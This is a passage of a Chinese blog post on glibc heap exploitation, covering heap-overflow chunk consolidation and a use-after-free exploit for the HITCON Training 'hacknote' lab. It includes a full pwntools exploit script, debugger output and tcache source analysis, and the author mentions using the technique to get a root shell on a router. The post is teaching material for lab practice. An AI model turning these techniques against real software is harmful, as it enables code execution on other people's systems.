&quot;15935728\x00&quot;;</span><br><span class="line">    memcpy(ptr5, data, 0x9);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 5 @ %p\t Contains: %s\n\n&quot;, ptr5, (char *)ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Just like that we use a heap overflow to cause a heap consolidation past an allocated chunk, get overlapping pointers, and edit a free chunk!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们先看看b1-b6几处的堆的情况。<br>在b1处下断点，目的是观察在free之前各个chunk的地址<br><img src="/images/heap_exp/2021-05-18-17-27-26.png" alt>  </p>
<p>在b2处下断点，我们得到heap bin的情况如下图<br><img src="/images/heap_exp/2021-05-18-17-28-36.png" alt><br>可以看出ptr0指向的chunk是被回收到了unsorted中，因为这个chunk已经超过tcache所能容纳的0x400的大小了，是直接由unsorted bin回收。<br>同时我们可以看下ptr2指向的chunk的metadata部分<br><img src="/images/heap_exp/2021-05-18-17-32-11.png" alt><br>如图所示，ptr2指向的chunk显示当前大小为0x510，而前一个紧邻的chunk的标志位为在使用</p>
<p>在b3处下断点，再看ptr2指向的chunk的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Chunk(addr=0x555555758c00, size=0x510, flags=)</span><br><span class="line">    [0x0000555555758c00     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br></pre></td></tr></table></figure></p>
<p>可以看出prev_inuse标志位已经被置空，而且标志前一个chunk的大小的数据为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/g 0x555555758c00-8-8</span><br><span class="line">0x555555758bf0:	0x590</span><br></pre></td></tr></table></figure></p>
<p>因此<code>ptr1[14] = 0x590;ptr1[15] = 0x510;</code>已经成功溢出，并且覆盖了ptr2块的元数据，修改了prev_chunk_size和current_chunk_size以及prev_inuse标志位。这就会导致当free ptr2的chunk的时候，根据glibc的源代码，free的时候会进行向前和向后的合并，如果前面那个chunk或者后面紧邻的chunk都是未使用的话，则会把他们融合为一个大的chunk放到unsorted bin上。</p>
<p>在b4处下断点，看下是否如我们所愿，有一个ptr2 大小的chunk和一个0x590相加之后的chunk被放到了unsorted bin上了。<br><img src="/images/heap_exp/2021-05-18-17-44-15.png" alt><br>如我们所愿，一个0x510 + 0x590 = 0xaa0大小的chunk被放置到了unsorted bin上了，所以实际上ptr1虽然没有被释放，已经被回收到了unsorted bin中了</p>
<p>在b5处下断点，观察新分配的ptr4，和ptr5的来源是哪里<br><img src="/images/heap_exp/2021-05-18-17-58-45.png" alt><br><img src="/images/heap_exp/2021-05-18-17-59-23.png" alt><br>由图我们可知unsorted bin会被分割成合适大小的chunk分别返回给0x500和0x70的两个chunk。<br>ptr5指向的实际上与ptr1指向的是同一个地址，就是由于溢出导致错误的将ptr1收回到了unsorted bin中了。</p>
<p>在b6处下断点，观察ptr1回收到了什么地方<br><img src="/images/heap_exp/2021-05-18-17-56-06.png" alt><br>由于ptr1是0x80大小的chunk，因此还是在tcache的0x20~0x410的大小范围内的。</p>
<p>最后的打印输出也显示ptr5与ptr1是指向的相同的地方的，而此时ptr1已经是被会回收到了tcache中了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chunk 1: 0x555555758b80	 Size: 0x70</span><br><span class="line"></span><br><span class="line">Chunk 5 @ 0x555555758b80	 Contains: 15935728</span><br></pre></td></tr></table></figure></p>
<p>这种攻击的方法主要是通过溢出，导致紧邻的chunk的头部被修改，包括标志位，以及前一个chunk的大小的修改，使得紧邻的chunk被free的时候能够造成错误的把一个chunk 回收，这样在后续的malloc中就可以直接修改这个错误回收的chunk的数据。这是一种比较常用的攻击手法，笔者在路由器的漏洞挖掘中曾经实用过这种攻击方法，并且成功拿到了root shell。</p>
<h2 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h2><p>UAF就是在释放之后仍然实用chunk，这个天然就是可以修改已经free的chunk。<br>实例采用一个经典的UAF练习<a href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c" target="_blank" rel="noopener">hitcon training</a><br>利用代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./hacknote&apos;)</span><br><span class="line">elf = ELF(&apos;./hacknote&apos;)</span><br><span class="line"></span><br><span class="line">magic = 0x08048986</span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.send(str(2))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def print_note(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(16,&apos;aa&apos;)</span><br><span class="line">create(16,&apos;bb&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">create(8,p32(magic))</span><br><span class="line">print_note(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>第一次调用malloc，生成一个struct note的结构，申请的是0x8大小的内存，实际上的chunk是0x8  + 0x8 = 0x10大小的chunk，malloc的返回地址是0x0804b1a0。<br>输入size为16，第二次调用malloc，为content生成内存空间，chunk大小为0x10 +0x8=0x18，返回地址为 0x0804b1b0。<br>不知为何heap chunks在这个地方是什么都不显示。只能依靠原始的方法在malloc处打断点，得到返回的地址。</p>
<p>第二次add node，第二次创建struct note, 堆地址为0x0804b1d0, content地址为0x0804b1e0 </p>
<p>第一次delte 第一个node，tcache的结果<br><img src="/images/heap_exp/2021-05-19-14-46-03.png" alt><br>这个感觉不太对，所以感觉在32位的时候貌似GEF的heap指令显示的结果都有点问题，自己尝试确定tcache真实的状态。<br>根据我的理解，tcache与fastbin类似，都是一个数组指针在维护，那么tcache的数组中必有一个指针是指向刚刚释放的note的，他的有效载荷的地址是0x0804b1a0，我们先通过search-pattern去搜索一下这个地址，看看能不能在libc的空间中找到记载这个地址的内存，如果有那么大概率就是tcache数组的地址，<br><img src="/images/heap_exp/2021-05-19-14-53-13.png" alt><br>后来并没有发现在libc的内存空间中有这个,只是在hacknote和heap中有这个，通过源码我们知道，必定有一个静态变量存储着tcache<br>再次对比源码我发现起始fastbin数组和tcache数组还是有着很大的区别的<br>fastbin数组的元素是chunk header的指针，也就是说这个数组中确实保存着指向堆区地址的指针，而<code>tcache_entry *entries[TCACHE_MAX_BINS];</code>这个数组的元素是指向tcache_entry的，而这个东西并不是malloc_chunk数据结构，它是在什么地方生成的，还不确定。<br>经过分析源码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际上就是将tcache_entry 实际上就是指向的chunk中有效负载的地址的。<br>向tcache中添加一个chunk的流程，当释放一个chunk的时候，首先得到他的有效负载的地址，将他赋值给一个tcache_entry指针e<br>e-&gt;key = tcache实际上就是chunk中的bk指针指向了tcache</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">  /* This field exists to detect double frees.  */</span><br><span class="line">  struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>而<code>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</code>的意义是让chunk的fd指针指向了某个地址，至于这个地址是什么我觉着应该是之前已经在这个tcache链表上的一个chunk的地址。这个需要我们分析<code>PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</code>到底干了什么，因为要插入到tcache，所以肯定有tcache中将数组中的元素指向了这个e，而这个e的值就是chunk中有效负载的地址，所以我们之前分析的不错，应该在libc中有一个地址指向0x0804b1a0。但是实际上并没有，所以还是有个地方出错了。</p>
<p>后来经过分析发现，tcache这个只不过是一个指针，它指向的内容并不一定是在全局变量区的，而有可能是堆上分配的，经过跟踪源码发现tcache的生成过程是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcache = (tcache_perthread_struct *) victim;</span><br><span class="line"></span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">_int_malloc&#123; p = sysmalloc (nb, av); return p;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/heap_exp/2021-05-24-12-22-24.png" alt><br>所以可以判断出来与fastbin数组不同的是，tcache是在堆上存储的数据结构，而各种bin则是在libc库的数据区存储的数据结构。所以我们通过search-pattern搜索到的就是tcache的位置，<code>0x804b090</code>这个应该就是0x10 chunk 所对应的元素地址。</p>
<p>还有一个不同就是tcache数组中存储的是指向有效负载地址的指针，而不是chunk的头部，而本来是fd，现在叫next的位置也是直接指向下一个有效负载的位置</p>
<p>如果我们理解正确的话，那么与<code>0x804b090</code>紧邻的地方存储的应该就是指向0x18chunk的有效负载的地址，就是我们content的地址 <code>0x0804b1b0</code>,验证试试。<br><img src="/images/heap_exp/2021-05-19-15-35-50.png" alt><br>我们发现果然是正确的，所以tcache的大致工作原理我用下面的这张图总结<br><img src="/images/heap_exp/2021-05-19-15-41-25.png" alt><br>注意tcache数组中的元素总是指向最新添加到tcache中的chunk的。当我们再次delete note的时候，可以继续观察0x804b090的指向，如果我们理解正确的话，这个地方应该是指向第二个note的地址0x0804b1d0， 0x804b094中存储的应该是第二个content地址0x0804b1e0。<br><img src="/images/heap_exp/2021-05-19-15-45-18.png" alt><br>而0x0804b1d0这个地址应该存储的是第一个note的地址，这样才能连接起来<br><img src="/images/heap_exp/2021-05-19-15-47-18.png" alt></p>
<p>当理解了整个heap的变化过程，我们很快就可以理解这个UAF exp的原理。</p>
<ol>
<li>首先创建两个note然后在删除两个note得到四个在tcache上的chunk,其中有两个chunk在0x10，另外连个在0x18</li>
<li>再创一个note，并且让content大小为8，这样就把两个chunk 0x10大小的给重新利用上了，这个新创建的note的content实际上就是第一个note</li>
<li>通过给这个content赋值，就可以修改第一个note的<code>void (*printnote)();</code>函数指针</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.jianshu.com/p/f894c2961ca6" target="_blank" rel="noopener">https://www.jianshu.com/p/f894c2961ca6</a></li>
<li><a href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c" target="_blank" rel="noopener">https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c</a></li>
<li><a href="http://p4nda.top/2018/03/20/tcache/" target="_blank" rel="noopener">http://p4nda.top/2018/03/20/tcache/</a></li>
<li><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/heap_consolidation_explanation/index.html" target="_blank" rel="noopener">https://guyinatuxedo.github.io/27-edit_free_chunk/heap_consolidation_explanation/index.html</a></li>
</ol>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag"># 堆利用</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/05/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%E5%BC%80%E7%AF%87/" rel="next" title="堆利用系列一：开篇">
                <i class="fa fa-chevron-left"></i> 堆利用系列一：开篇
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/" rel="prev" title="堆利用系列三：Unlink">
                堆利用系列三：Unlink <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://avatars1.githubusercontent.com/u/13530839?s=460&v=4"
                alt="Colorlight"/>
            
              <p class="site-author-name" itemprop="name">Colorlight</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/%20%7C%7C%20archive">
                
                    <span class="site-state-item-count">12</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/%20%7C%7C%20th">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/%20%7C%7C%20tags">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">8</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>

          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          

          

          
          

          
            
          

          

<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
<div class="widget-wrap">
    <h3 class="widget-title"></h3>
    <div id="myCanvasContainer" class="widget tagcloud">
        <canvas width="250" height="250" id="resCanvas" style="width=100%">
            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz-%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5/" rel="tag">Fuzz 变异策略</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT-Security/" rel="tag">IoT Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LTE%E5%AE%89%E5%85%A8/" rel="tag">LTE安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWS/" rel="tag">PWS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROOT-CAUSE/" rel="tag">ROOT CAUSE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E9%80%A0%E5%9C%B0%E9%9C%87%E6%B6%88%E6%81%AF/" rel="tag">伪造地震消息</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag">堆利用</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E/" rel="tag">如何发现漏洞</a><span class="tag-list-count">1</span></li></ul>
        </canvas>
    </div>
</div>

        </div>
      </div>


      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">堆漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Free%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">Double Free漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">堆溢出漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UAF%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">UAF漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>

  </aside>



  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <center>
<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Colorlight</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.4.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.0.1</div>





<center>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
</center>

</center>

        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=7.0.1"></script>

  <script src="/js/src/motion.js?v=7.0.1"></script>



  
  


  <script src="/js/src/affix.js?v=7.0.1"></script>

  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>



  
  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
<script src="/js/src/post-details.js?v=7.0.1"></script>



  


  <script src="/js/src/next-boot.js?v=7.0.1"></script>


  

  

  

  
  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'nvTbKb5mM9SX7hcCzBN7pMf8-gzGzoHsz',
    appKey: 'QieslIVE2MFME3VlCkgjdn90',
    placeholder: '欢迎交流朋友~',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false,
    lang: '' || 'zh-cn'
  });
</script>




  


  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
